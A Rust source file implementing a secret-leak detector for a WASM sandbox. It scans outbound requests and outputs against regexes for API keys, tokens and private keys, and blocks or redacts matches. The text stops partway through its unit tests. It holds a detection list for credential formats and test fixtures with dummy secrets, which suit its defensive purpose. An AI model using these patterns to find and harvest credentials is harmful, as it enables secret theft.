//! Secret leak detection for WASM sandbox.
//!
//! Scans data at the sandbox boundary to prevent secret exfiltration.
//! Uses Aho-Corasick for fast multi-pattern matching plus regex for
//! complex patterns.
//!
//! # Security Model
//!
//! Leak detection happens at TWO points:
//!
//! 1. **Before outbound requests** - Prevents WASM from exfiltrating secrets
//!    by encoding them in URLs, headers, or request bodies
//! 2. **After responses/outputs** - Prevents accidental exposure in logs,
//!    tool outputs, or data returned to WASM
//!
//! # Architecture
//!
//! ```text
//! ┌─────────────────────────────────────────────────────────────────────────────┐
//! │                         WASM HTTP Request Flow                              │
//! │                                                                              │
//! │   WASM ──► Allowlist ──► Leak Scan ──► Credential ──► Execute ──► Response │
//! │            Validator     (request)     Injector       Request      │        │
//! │                                                                    ▼        │
//! │                                      WASM ◀── Leak Scan ◀── Response       │
//! │                                               (response)                    │
//! └─────────────────────────────────────────────────────────────────────────────┘
//!
//! ┌─────────────────────────────────────────────────────────────────────────────┐
//! │                           Scan Result Actions                               │
//! │                                                                              │
//! │   LeakDetector.scan() ──► LeakScanResult                                   │
//! │                               │                                             │
//! │                               ├─► clean: pass through                       │
//! │                               ├─► warn: log, pass                           │
//! │                               ├─► redact: mask secret                       │
//! │                               └─► block: reject entirely                    │
//! └─────────────────────────────────────────────────────────────────────────────┘
//! ```

use std::ops::Range;

use aho_corasick::AhoCorasick;
use regex::Regex;

const MAX_BARE_JWT_CANDIDATE_LEN: usize = 64 * 1024;

/// Action to take when a leak is detected.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum LeakAction {
    /// Block the output entirely (for critical secrets).
    Block,
    /// Redact the secret, replacing it with [REDACTED].
    Redact,
    /// Log a warning but allow the output.
    Warn,
}

impl std::fmt::Display for LeakAction {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            LeakAction::Block => write!(f, "block"),
            LeakAction::Redact => write!(f, "redact"),
            LeakAction::Warn => write!(f, "warn"),
        }
    }
}

/// Severity of a detected leak.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum LeakSeverity {
    Low,
    Medium,
    High,
    Critical,
}

impl std::fmt::Display for LeakSeverity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            LeakSeverity::Low => write!(f, "low"),
            LeakSeverity::Medium => write!(f, "medium"),
            LeakSeverity::High => write!(f, "high"),
            LeakSeverity::Critical => write!(f, "critical"),
        }
    }
}

/// A pattern for detecting secret leaks.
#[derive(Debug, Clone)]
pub struct LeakPattern {
    pub name: String,
    pub regex: Regex,
    pub severity: LeakSeverity,
    pub action: LeakAction,
}

/// A detected potential secret leak.
#[derive(Debug, Clone)]
pub struct LeakMatch {
    pub pattern_name: String,
    pub severity: LeakSeverity,
    pub action: LeakAction,
    /// Location in the scanned content.
    pub location: Range<usize>,
    /// A preview of the match with the secret partially masked.
    pub masked_preview: String,
}

/// Result of scanning content for leaks.
#[derive(Debug)]
pub struct LeakScanResult {
    /// All detected potential leaks.
    pub matches: Vec<LeakMatch>,
    /// Whether any match requires blocking.
    pub should_block: bool,
    /// Content with secrets redacted (if redaction was applied).
    pub redacted_content: Option<String>,
}

impl LeakScanResult {
    /// Check if content is clean (no leaks detected).
    pub fn is_clean(&self) -> bool {
        self.matches.is_empty()
    }

    /// Get the highest severity found.
    pub fn max_severity(&self) -> Option<LeakSeverity> {
        self.matches.iter().map(|m| m.severity).max()
    }

    /// Redact every matched range, regardless of its configured action.
    ///
    /// Consumers such as compaction use this when retaining surrounding
    /// context is safe but no detected secret value may cross the boundary.
    /// Match ranges are validated before slicing so a malformed scanner
    /// implementation fails closed instead of panicking or returning partially
    /// redacted content.
    pub fn redact_all_matches(&self, content: &str) -> Result<Option<String>, LeakRedactionError> {
        if self.matches.is_empty() {
            return Ok(None);
        }
        let mut ranges = Vec::with_capacity(self.matches.len());
        for leak_match in &self.matches {
            let range = leak_match.location.clone();
            if range.start >= range.end
                || range.end > content.len()
                || !content.is_char_boundary(range.start)
                || !content.is_char_boundary(range.end)
            {
                return Err(LeakRedactionError::InvalidMatchRange);
            }
            ranges.push(range);
        }
        Ok(Some(apply_redactions(content, &ranges)))
    }
}

/// Detector for secret leaks in output data.
pub struct LeakDetector {
    patterns: Vec<LeakPattern>,
    /// For fast prefix matching of known patterns
    prefix_matcher: Option<AhoCorasick>,
    known_prefixes: Vec<(String, usize)>, // (prefix, pattern_index)
}

impl LeakDetector {
    /// Create a new detector with default patterns.
    pub fn new() -> Self {
        Self::with_patterns(default_patterns())
    }

    /// Create a detector with custom patterns.
    pub fn with_patterns(patterns: Vec<LeakPattern>) -> Self {
        // Build prefix matcher for patterns that start with a known prefix
        let mut prefixes = Vec::new();
        for (idx, pattern) in patterns.iter().enumerate() {
            if let Some(prefix) = extract_literal_prefix(pattern.regex.as_str())
                && prefix.len() >= 3
            {
                prefixes.push((prefix, idx));
            }
        }

        let prefix_matcher = if !prefixes.is_empty() {
            let prefix_strings: Vec<&str> = prefixes.iter().map(|(s, _)| s.as_str()).collect();
            AhoCorasick::builder()
                .ascii_case_insensitive(false)
                .build(&prefix_strings)
                .ok()
        } else {
            None
        };

        Self {
            patterns,
            prefix_matcher,
            known_prefixes: prefixes,
        }
    }

    /// Scan content for potential secret leaks.
    pub fn scan(&self, content: &str) -> LeakScanResult {
        let mut matches = Vec::new();
        let mut should_block = false;
        let mut redact_ranges = Vec::new();

        // Use prefix matcher for quick elimination
        let candidate_indices: Vec<usize> = if let Some(ref matcher) = self.prefix_matcher {
            let mut indices = Vec::new();
            for mat in matcher.find_iter(content) {
                let found_prefix = &self.known_prefixes[mat.pattern().as_usize()].0;
                // Add all patterns whose prefix overlaps with the found prefix.
                // This handles two cases:
                // 1. A short prefix shadows a longer one (e.g. "sk-" shadows "sk-ant-api")
                // 2. Duplicate prefixes mapping to different patterns (e.g. "-----BEGIN" for PEM and SSH)
                for (other_prefix, other_idx) in &self.known_prefixes {
                    if (other_prefix.starts_with(found_prefix.as_str())
                        || found_prefix.starts_with(other_prefix.as_str()))
                        && !indices.contains(other_idx)
                    {
                        indices.push(*other_idx);
                    }
                }
            }
            // Also include patterns without prefixes
            for (idx, _) in self.patterns.iter().enumerate() {
                if !self.known_prefixes.iter().any(|(_, i)| *i == idx) && !indices.contains(&idx) {
                    indices.push(idx);
                }
            }
            indices
        } else {
            (0..self.patterns.len()).collect()
        };

        // Check candidate patterns
        for idx in candidate_indices {
            let pattern = &self.patterns[idx];
            for mat in pattern.regex.find_iter(content) {
                let matched_text = mat.as_str();
                if pattern.name == "bare_jwt" && !has_json_web_token_header(matched_text) {
                    continue;
                }
                let location = mat.start()..mat.end();
                let masked_preview = match pattern.name.as_str() {
                    "pem_private_key" | "ssh_private_key" => "[PRIVATE_KEY]".to_string(),
                    _ => mask_secret(matched_text),
                };

                let leak_match = LeakMatch {
                    pattern_name: pattern.name.clone(),
                    severity: pattern.severity,
                    action: pattern.action,
                    location: location.clone(),
                    masked_preview,
                };

                if pattern.action == LeakAction::Block {
                    should_block = true;
                }

                if pattern.action == LeakAction::Redact {
                    redact_ranges.push(location.clone());
                }

                matches.push(leak_match);
            }
        }

        // Sort by location for proper redaction
        matches.sort_by_key(|m| m.location.start);
        redact_ranges.sort_by_key(|r| r.start);

        // Build redacted content if needed
        let redacted_content = if !redact_ranges.is_empty() {
            Some(apply_redactions(content, &redact_ranges))
        } else {
            None
        };

        LeakScanResult {
            matches,
            should_block,
            redacted_content,
        }
    }

    /// Scan content and return cleaned version based on action.
    ///
    /// Returns `Err` if content should be blocked, `Ok(content)` otherwise.
    pub fn scan_and_clean(&self, content: &str) -> Result<String, LeakDetectionError> {
        let result = self.scan(content);

        if result.should_block {
            // Find the blocking match for error message
            let blocking_match = result
                .matches
                .iter()
                .find(|m| m.action == LeakAction::Block);
            return Err(LeakDetectionError::SecretLeakBlocked {
                pattern: blocking_match
                    .map(|m| m.pattern_name.clone())
                    .unwrap_or_default(),
                preview: blocking_match
                    .map(|m| m.masked_preview.clone())
                    .unwrap_or_default(),
            });
        }

        // Log warn-action matches at debug level (not warn!) to avoid
        // corrupting REPL/TUI output. These are informational — real leaks
        // use LeakAction::Redact which modifies the content silently.
        for m in &result.matches {
            if m.action == LeakAction::Warn {
                tracing::debug!(
                    pattern = %m.pattern_name,
                    severity = %m.severity,
                    preview = %m.masked_preview,
                    "Potential secret leak detected (warning only)"
                );
            }
        }

        // Return redacted content if any, otherwise original
        Ok(result
            .redacted_content
            .unwrap_or_else(|| content.to_string()))
    }

    /// Redact every detected secret VALUE in `content`, preserving the
    /// surrounding descriptive text.
    ///
    /// Unlike [`Self::scan_and_clean`], this never returns an error: a
    /// `Block`-severity match is redacted in place rather than blocking the
    /// whole string, and lower-severity (`Redact`/`Warn`) matches are redacted
    /// too. Intended for the model-visible error `detail` channel, where the
    /// descriptive cause (paths, status codes, schema refs) must survive so the
    /// model can retry or explain, but no secret value may reach the model.
    ///
    /// Returns the redacted string and whether any redaction was applied.
    pub fn redact_all_secrets(&self, content: &str) -> (String, bool) {
        let result = self.scan(content);
        if result.matches.is_empty() {
            return (content.to_string(), false);
        }
        // `apply_redactions` coalesces overlapping/adjacent ranges itself, so a
        // single value always redacts to one `[REDACTED]`.
        let ranges: Vec<Range<usize>> = result.matches.iter().map(|m| m.location.clone()).collect();
        (apply_redactions(content, &ranges), true)
    }

    /// Scan an outbound HTTP request for potential secret leakage.
    ///
    /// This MUST be called before executing any HTTP request from WASM
    /// to prevent exfiltration of secrets via URL, headers, or body.
    ///
    /// Returns `Err` if any part contains a blocked secret pattern.
    pub fn scan_http_request(
        &self,
        url: &str,
        headers: &[(String, String)],
        body: Option<&[u8]>,
    ) -> Result<(), LeakDetectionError> {
        // Scan URL (most common exfiltration vector)
        self.scan_and_clean(url)?;

        // Scan each header value
        for (name, value) in headers {
            self.scan_and_clean(value)
                .map_err(|e| LeakDetectionError::SecretLeakBlocked {
                    pattern: format!("header:{}", name),
                    preview: e.to_string(),
                })?;
        }

        // Scan body if present. Use lossy UTF-8 conversion so a leading
        // non-UTF8 byte can't be used to skip scanning entirely.
        if let Some(body_bytes) = body {
            let body_str = String::from_utf8_lossy(body_bytes);
            self.scan_and_clean(&body_str)?;
        }

        Ok(())
    }

    /// Add a custom pattern at runtime.
    pub fn add_pattern(&mut self, pattern: LeakPattern) {
        self.patterns.push(pattern);
        // Note: prefix_matcher won't be updated; rebuild if needed
    }

    /// Get the number of patterns.
    pub fn pattern_count(&self) -> usize {
        self.patterns.len()
    }
}

impl Default for LeakDetector {
    fn default() -> Self {
        Self::new()
    }
}

/// Error from leak detection.
#[derive(Debug, Clone, thiserror::Error)]
pub enum LeakDetectionError {
    #[error("Secret leak blocked: pattern '{pattern}' matched '{preview}'")]
    SecretLeakBlocked { pattern: String, preview: String },
}

/// A scanner supplied a match range that cannot be safely redacted.
#[derive(Debug, Clone, Copy, PartialEq, Eq, thiserror::Error)]
pub enum LeakRedactionError {
    #[error("leak scanner returned an invalid match range")]
    InvalidMatchRange,
}

/// Mask a secret for safe display.
///
/// Shows first 4 and last 4 characters, masks the middle.
fn mask_secret(secret: &str) -> String {
    let len = secret.len();
    if len <= 8 {
        return "*".repeat(len);
    }

    let prefix: String = secret.chars().take(4).collect();
    let suffix: String = secret.chars().skip(len - 4).collect();
    let middle_len = len - 8;
    format!("{}{}{}", prefix, "*".repeat(middle_len.min(8)), suffix)
}

/// Apply redaction ranges to content.
/// Sort and coalesce match ranges so overlapping or adjacent spans of one
/// secret (different patterns matching the same value, e.g. `bearer_token` and
/// `bare_jwt` over one `Bearer <jwt>`) collapse into a single disjoint range.
fn merge_ranges(ranges: &[Range<usize>]) -> Vec<Range<usize>> {
    let mut ranges: Vec<Range<usize>> = ranges.to_vec();
    ranges.sort_by_key(|range| range.start);
    let mut merged: Vec<Range<usize>> = Vec::with_capacity(ranges.len());
    for range in ranges {
        match merged.last_mut() {
            Some(last) if range.start <= last.end => {
                if range.end > last.end {
                    last.end = range.end;
                }
            }
            _ => merged.push(range),
        }
    }
    merged
}

fn apply_redactions(content: &str, ranges: &[Range<usize>]) -> String {
    if ranges.is_empty() {
        return content.to_string();
    }

    // Coalesce first: callers pass raw per-pattern ranges that can overlap, and
    // emitting one `[REDACTED]` per raw range double-redacts a single secret
    // (e.g. `Bearer eyJ…` -> `[REDACTED][REDACTED]`). Merging here keeps every
    // caller correct without each having to pre-merge.
    let ranges = merge_ranges(ranges);

    let mut result = String::with_capacity(content.len());
    let mut last_end = 0;

    for range in ranges {
        if range.start > last_end {
            result.push_str(&content[last_end..range.start]);
        }
        result.push_str("[REDACTED]");
        last_end = range.end;
    }

    if last_end < content.len() {
        result.push_str(&content[last_end..]);
    }

    result
}

/// Extract a literal prefix from a regex pattern (if one exists).
fn extract_literal_prefix(pattern: &str) -> Option<String> {
    let mut prefix = String::new();

    for ch in pattern.chars() {
        match ch {
            // These start special regex constructs
            '[' | '(' | '.' | '*' | '+' | '?' | '{' | '|' | '^' | '$' => break,
            // Escape sequence
            '\\' => break,
            // Regular character
            _ => prefix.push(ch),
        }
    }

    if prefix.len() >= 3 {
        Some(prefix)
    } else {
        None
    }
}

fn has_json_web_token_header(candidate: &str) -> bool {
    // Keep the regex unbounded so it consumes the complete base64url run and
    // redaction cannot leave a secret tail. Oversized three-segment candidates
    // fail closed as sensitive without allocating a decode buffer or parsing
    // attacker-controlled JSON.
    if candidate.len() > MAX_BARE_JWT_CANDIDATE_LEN {
        return true;
    }
    let mut segments = candidate.split('.');
    let (Some(header), Some(_payload), Some(_signature), None) = (
        segments.next(),
        segments.next(),
        segments.next(),
        segments.next(),
    ) else {
        return false;
    };
    let Some(header) = decode_base64url_no_pad(header) else {
        return false;
    };
    matches!(
        serde_json::from_slice::<serde_json::Value>(&header),
        Ok(serde_json::Value::Object(fields))
            if fields.get("alg").and_then(serde_json::Value::as_str).is_some()
    )
}

fn decode_base64url_no_pad(input: &str) -> Option<Vec<u8>> {
    if input.is_empty() || input.len() % 4 == 1 {
        return None;
    }
    let mut output = Vec::with_capacity(input.len() * 3 / 4);
    let mut accumulator = 0_u32;
    let mut bits = 0_u8;
    for byte in input.bytes() {
        let value = match byte {
            b'A'..=b'Z' => byte - b'A',
            b'a'..=b'z' => byte - b'a' + 26,
            b'0'..=b'9' => byte - b'0' + 52,
            b'-' => 62,
            b'_' => 63,
            _ => return None,
        };
        accumulator = (accumulator << 6) | u32::from(value);
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            output.push(((accumulator >> bits) & 0xff) as u8);
            accumulator &= if bits == 0 { 0 } else { (1_u32 << bits) - 1 };
        }
    }
    if accumulator != 0 {
        return None;
    }
    Some(output)
}

/// Default leak detection patterns.
fn default_patterns() -> Vec<LeakPattern> {
    vec![
        // OpenAI API keys
        LeakPattern {
            name: "openai_api_key".to_string(),
            regex: Regex::new(r"sk-(?:proj-)?[a-zA-Z0-9]{20,}(?:T3BlbkFJ[a-zA-Z0-9_-]*)?").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::Critical,
            action: LeakAction::Block,
        },
        // Anthropic API keys
        LeakPattern {
            name: "anthropic_api_key".to_string(),
            regex: Regex::new(r"sk-ant-api[a-zA-Z0-9_-]{90,}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::Critical,
            action: LeakAction::Block,
        },
        // AWS Access Key ID
        LeakPattern {
            name: "aws_access_key".to_string(),
            regex: Regex::new(r"AKIA[0-9A-Z]{16}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::Critical,
            action: LeakAction::Block,
        },
        // GitHub tokens
        LeakPattern {
            name: "github_token".to_string(),
            regex: Regex::new(r"gh[pousr]_[A-Za-z0-9_]{36,}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::Critical,
            action: LeakAction::Block,
        },
        // GitHub fine-grained PAT
        LeakPattern {
            name: "github_fine_grained_pat".to_string(),
            regex: Regex::new(r"github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::Critical,
            action: LeakAction::Block,
        },
        // Stripe keys
        LeakPattern {
            name: "stripe_api_key".to_string(),
            regex: Regex::new(r"sk_(?:live|test)_[a-zA-Z0-9]{24,}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::Critical,
            action: LeakAction::Block,
        },
        // NEAR AI session tokens
        LeakPattern {
            name: "nearai_session".to_string(),
            regex: Regex::new(r"sess_[a-zA-Z0-9]{32,}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::Critical,
            action: LeakAction::Block,
        },
        // PEM private keys
        LeakPattern {
            name: "pem_private_key".to_string(),
            // Match the complete block so value-redaction consumers cannot
            // remove only the BEGIN sentinel while retaining key material.
            // A missing END sentinel consumes the bounded remainder of the
            // scanned content, which deliberately over-redacts fail-safe.
            regex: Regex::new(
                r"-----BEGIN(?s:(?:\s+RSA\s+PRIVATE\s+KEY-----.*?(?:-----END\s+RSA\s+PRIVATE\s+KEY-----|$)|\s+PRIVATE\s+KEY-----.*?(?:-----END\s+PRIVATE\s+KEY-----|$)))",
            )
            .unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::Critical,
            action: LeakAction::Block,
        },
        // SSH private keys
        LeakPattern {
            name: "ssh_private_key".to_string(),
            regex: Regex::new(
                r"-----BEGIN(?s:(?:\s+OPENSSH\s+PRIVATE\s+KEY-----.*?(?:-----END\s+OPENSSH\s+PRIVATE\s+KEY-----|$)|\s+EC\s+PRIVATE\s+KEY-----.*?(?:-----END\s+EC\s+PRIVATE\s+KEY-----|$)|\s+DSA\s+PRIVATE\s+KEY-----.*?(?:-----END\s+DSA\s+PRIVATE\s+KEY-----|$)))",
            )
            .unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::Critical,
            action: LeakAction::Block,
        },
        // Google API keys
        LeakPattern {
            name: "google_api_key".to_string(),
            regex: Regex::new(r"AIza[0-9A-Za-z_-]{35}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::High,
            action: LeakAction::Block,
        },
        // Slack tokens
        LeakPattern {
            name: "slack_token".to_string(),
            regex: Regex::new(r"xox[baprs]-[0-9a-zA-Z-]{10,}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::High,
            action: LeakAction::Block,
        },
        // Twilio API keys
        LeakPattern {
            name: "twilio_api_key".to_string(),
            regex: Regex::new(r"SK[a-fA-F0-9]{32}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::High,
            action: LeakAction::Block,
        },
        // SendGrid API keys
        LeakPattern {
            name: "sendgrid_api_key".to_string(),
            regex: Regex::new(r"SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::High,
            action: LeakAction::Block,
        },
        // Bare JSON Web Tokens. The regex finds the three-segment base64url
        // shape; the scanner then decodes and validates the JSON header. This
        // avoids package-name false positives without assuming that the header
        // JSON begins immediately with `{`.
        LeakPattern {
            name: "bare_jwt".to_string(),
            regex: Regex::new(r"\b[a-zA-Z0-9_-]{4,}\.[a-zA-Z0-9_-]{8,}\.[a-zA-Z0-9_-]{8,}")
                .unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::High,
            action: LeakAction::Redact,
        },
        // Bearer tokens (redact instead of block, might be intentional)
        LeakPattern {
            name: "bearer_token".to_string(),
            regex: Regex::new(r"Bearer\s+[a-zA-Z0-9._-]{20,}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::High,
            action: LeakAction::Redact,
        },
        // Authorization header with key
        LeakPattern {
            name: "auth_header".to_string(),
            regex: Regex::new(r"(?i)authorization:\s*[a-zA-Z]+\s+[a-zA-Z0-9_-]{20,}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::High,
            action: LeakAction::Redact,
        },
        // OpenRouter API keys (sk-or-v1-<hex, 40+ chars>)
        LeakPattern {
            name: "openrouter_api_key".to_string(),
            regex: Regex::new(r"\bsk-or-v1-[a-fA-F0-9]{40,}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::Critical,
            action: LeakAction::Block,
        },
        // Anthropic OAuth tokens (sk-ant-oat<NN>-<base64url, 50+ chars>)
        LeakPattern {
            name: "anthropic_oauth_token".to_string(),
            regex: Regex::new(r"\bsk-ant-oat\d{2}-[a-zA-Z0-9_-]{50,}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::Critical,
            action: LeakAction::Block,
        },
        // Telegram bot tokens (<8-12 digit bot_id>:AA<base64url, 30+ chars>)
        // Leading word boundary prevents false positives on timestamp-keyed log entries.
        LeakPattern {
            name: "telegram_bot_token".to_string(),
            regex: Regex::new(r"\b\d{8,12}:AA[A-Za-z0-9_-]{30,}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::Critical,
            action: LeakAction::Block,
        },
        // Groq API keys (gsk_<alphanumeric, 30+ chars>)
        LeakPattern {
            name: "groq_api_key".to_string(),
            regex: Regex::new(r"\bgsk_[A-Za-z0-9]{30,}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::Critical,
            action: LeakAction::Block,
        },
        // Sandbox credential placeholder (icsbx_<identifier>). The credential
        // firewall injects these inert placeholders into the sandbox in place
        // of real secrets; the egress proxy swaps them for the real credential
        // at request time. A placeholder must never cross the trust boundary
        // into model output, logs, or transcripts, so it is treated like any
        // other secret.
        //
        // Deliberately NO `\b` word boundaries here: `_` is a word character,
        // so a boundary assertion does not fire next to it, meaning a single
        // leading or trailing character (`_icsbx_...`, `icsbx_..._x`) would
        // otherwise slip past the one pattern standing between a placeholder
        // and model output/logs. `icsbx_` plus 16+ alphanumerics is a
        // distinctive shape that does not occur naturally, so a bare
        // substring match carries no realistic false-positive risk — and
        // over-matching here fails *safe*, whereas under-matching would not.
        // Do not "helpfully" restore the word boundaries.
        //
        // The `icsbx_` literal here must stay in sync with
        // `ironclaw_secrets::placeholder::CREDENTIAL_PLACEHOLDER_PREFIX`
        // (crates/ironclaw_secrets/src/placeholder.rs), which is the actual
        // owner of this prefix. `ironclaw_safety` deliberately does not take
        // `ironclaw_secrets` as a normal dependency just to share one string
        // constant — see `sandbox_credential_placeholder_prefix_matches_registry`
        // below, a dev-dependency-only regression test that fails loudly if
        // the two ever drift apart.
        LeakPattern {
            name: "sandbox_credential_placeholder".to_string(),
            regex: Regex::new(r"icsbx_[A-Za-z0-9]{16,}").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::Critical,
            action: LeakAction::Block,
        },
        // High entropy hex (potential secrets, warn only)
        // Uses word boundary since look-around isn't supported in the regex crate.
        // This catches standalone 64-char hex strings (like SHA256 hashes used as secrets).
        LeakPattern {
            name: "high_entropy_hex".to_string(),
            regex: Regex::new(r"\b[a-fA-F0-9]{64}\b").unwrap(), // safety: hardcoded literal
            severity: LeakSeverity::Medium,
            action: LeakAction::Warn,
        },
    ]
}

#[cfg(test)]
mod tests {
    use crate::leak_detector::{
        LeakAction, LeakDetectionError, LeakDetector, LeakMatch, LeakRedactionError,
        LeakScanResult, LeakSeverity, MAX_BARE_JWT_CANDIDATE_LEN,
    };

    #[test]
    fn test_detect_openai_key() {
        let detector = LeakDetector::new();
        let content = "API key: sk-proj-abc123def456ghi789jkl012mno345pqrT3BlbkFJtest123";

        let result = detector.scan(content);
        assert!(!result.is_clean());
        assert!(result.should_block);
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.pattern_name == "openai_api_key")
        );
    }

    #[test]
    fn test_detect_github_token() {
        let detector = LeakDetector::new();
        let content = "token: ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";

        let result = detector.scan(content);
        assert!(!result.is_clean());
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.pattern_name == "github_token")
        );
    }

    #[test]
    fn test_detect_aws_key() {
        let detector = LeakDetector::new();
        let content = "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE";

        let result = detector.scan(content);
        assert!(!result.is_clean());
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.pattern_name == "aws_access_key")
        );
    }

    #[test]
    fn test_detect_pem_key() {
        let detector = LeakDetector::new();
        let content = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...";

        let result = detector.scan(content);
        assert!(!result.is_clean());
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.pattern_name == "pem_private_key")
        );
    }

    #[test]
    fn private_key_patterns_use_the_shared_begin_prefix_filter() {
        let detector = LeakDetector::new();

        for pattern_name in ["pem_private_key", "ssh_private_key"] {
            let pattern_index = detector
                .patterns
                .iter()
                .position(|pattern| pattern.name == pattern_name)
                .expect("default private-key pattern should exist");

            assert!(
                detector
                    .known_prefixes
                    .iter()
                    .any(|(prefix, index)| prefix == "-----BEGIN" && *index == pattern_index),
                "{pattern_name} should be eliminated before regex matching when the input has no private-key sentinel"
            );
        }
    }

    #[test]
    fn private_key_redaction_removes_the_complete_bounded_block() {
        let detector = LeakDetector::new();
        let content = concat!(
            "before\n",
            "-----BEGIN RSA PRIVATE KEY-----\n",
            "TEST_PRIVATE_KEY_MATERIAL\n",
            "-----END RSA PRIVATE KEY-----\n",
            "after"
        );

        let scan = detector.scan(content);
        let redacted = scan
            .redact_all_matches(content)
            .expect("valid detector ranges")
            .expect("private key should be redacted");

        assert_eq!(redacted, "before\n[REDACTED]\nafter");
        assert!(!redacted.contains("TEST_PRIVATE_KEY_MATERIAL"));
    }

    #[test]
    fn private_key_redaction_covers_every_supported_delimiter_pair() {
        let detector = LeakDetector::new();

        for label in [
            "RSA PRIVATE KEY",
            "PRIVATE KEY",
            "OPENSSH PRIVATE KEY",
            "EC PRIVATE KEY",
            "DSA PRIVATE KEY",
        ] {
            let content = format!(
                "before\n-----BEGIN {label}-----\nTEST_PRIVATE_KEY_MATERIAL\n-----END {label}-----\nafter"
            );

            let scan = detector.scan(&content);
            let redacted = scan
                .redact_all_matches(&content)
                .expect("valid detector ranges")
                .expect("private key should be redacted");

            assert_eq!(redacted, "before\n[REDACTED]\nafter", "label: {label}");
            assert!(
                !redacted.contains("TEST_PRIVATE_KEY_MATERIAL"),
                "label: {label}"
            );
        }
    }

    #[test]
    fn private_key_patterns_leave_public_key_near_misses_clean() {
        let detector = LeakDetector::new();

        for label in ["RSA PUBLIC KEY", "OPENSSH PUBLIC KEY", "CERTIFICATE"] {
            let content = format!(
                "before\n-----BEGIN {label}-----\nPUBLIC_MATERIAL\n-----END {label}-----\nafter"
            );

            assert!(detector.scan(&content).is_clean(), "label: {label}");
        }
    }

    #[test]
    fn unterminated_private_key_redaction_consumes_the_bounded_remainder() {
        let detector = LeakDetector::new();

        for label in [
            "RSA PRIVATE KEY",
            "PRIVATE KEY",
            "OPENSSH PRIVATE KEY",
            "EC PRIVATE KEY",
            "DSA PRIVATE KEY",
        ] {
            let content = format!("before\n-----BEGIN {label}-----\nTEST_PRIVATE_KEY_MATERIAL");
            let scan = detector.scan(&content);
            let redacted = scan
                .redact_all_matches(&content)
                .expect("valid detector ranges")
                .expect("private key should be redacted");

            assert_eq!(redacted, "before\n[REDACTED]", "label: {label}");
        }
    }

    #[test]
    fn mismatched_private_key_end_label_does_not_truncate_redaction() {
        let detector = LeakDetector::new();

        for (begin_label, mismatched_end_label) in [
            ("RSA PRIVATE KEY", "PRIVATE KEY"),
            ("PRIVATE KEY", "RSA PRIVATE KEY"),
            ("OPENSSH PRIVATE KEY", "EC PRIVATE KEY"),
            ("EC PRIVATE KEY", "DSA PRIVATE KEY"),
            ("DSA PRIVATE KEY", "EC PRIVATE KEY"),
        ] {
            let content = format!(
                "before\n-----BEGIN {begin_label}-----\nFIRST_PRIVATE_KEY_FRAGMENT\n-----END {mismatched_end_label}-----\nTRAILING_PRIVATE_KEY_FRAGMENT"
            );
            let scan = detector.scan(&content);
            let redacted = scan
                .redact_all_matches(&content)
                .expect("valid detector ranges")
                .expect("private key should be redacted");

            assert_eq!(
                redacted, "before\n[REDACTED]",
                "begin: {begin_label}, end: {mismatched_end_label}"
            );
            assert!(!redacted.contains("TRAILING_PRIVATE_KEY_FRAGMENT"));
        }
    }

    #[test]
    fn unterminated_private_key_error_preview_is_constant() {
        let detector = LeakDetector::new();
        let private_material = "TEST_PRIVATE_KEY_SUFFIX";
        let content = format!("-----BEGIN OPENSSH PRIVATE KEY-----\n{private_material}");

        let error = detector
            .scan_and_clean(&content)
            .expect_err("private keys should remain blocked outside retention boundaries");
        let LeakDetectionError::SecretLeakBlocked { preview, .. } = &error;

        assert_eq!(preview, "[PRIVATE_KEY]");
        assert!(!preview.contains(private_material));
        assert!(!error.to_string().contains("FFIX"));
    }

    #[test]
    fn test_clean_content() {
        let detector = LeakDetector::new();
        let content = "Hello world! This is just regular text with no secrets.";

        let result = detector.scan(content);
        assert!(result.is_clean());
        assert!(!result.should_block);
    }

    #[test]
    fn test_redact_bearer_token() {
        let detector = LeakDetector::new();
        let content = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9_longtokenvalue";

        let result = detector.scan(content);
        assert!(!result.is_clean());
        assert!(!result.should_block); // Bearer is redact, not block

        let redacted = result.redacted_content.unwrap();
        assert!(redacted.contains("[REDACTED]"));
        assert!(!redacted.contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"));
    }

    #[test]
    fn test_redact_bearer_jwt_token_without_tail_leak() {
        let detector = LeakDetector::new();
        let header = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9";
        let payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
        let signature = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
